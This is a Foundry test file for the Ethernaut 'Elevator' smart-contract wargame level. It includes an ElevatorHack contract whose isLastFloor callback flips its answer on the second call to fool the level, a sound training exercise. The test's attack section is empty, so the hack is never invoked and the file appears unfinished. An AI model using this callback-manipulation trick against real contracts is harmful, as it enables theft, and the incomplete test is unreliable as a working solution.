// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Elevator/ElevatorFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

// forge test --match-contract ElevatorTest -vvvv
contract ElevatorTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our address 5 ether
    }

    function testElevatorHack() public {
        /****************
         * Factory setup *
         *************** */
        ElevatorFactory elevatorFactory = new ElevatorFactory();
        ethernaut.registerLevel(elevatorFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(elevatorFactory);
        Elevator ethernautElevator = Elevator(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract ElevatorHack {
    Elevator public challenge;
    uint256 timesCalled;

    constructor(address challengeAddress) {
        challenge = Elevator(challengeAddress);
    }

    function attack() external payable {
        challenge.goTo(0);
    }

    function isLastFloor(
        uint256 /* floor */
    ) external returns (bool) {
        timesCalled++;
        if (timesCalled > 1) return true;
        else return false;
    }
}
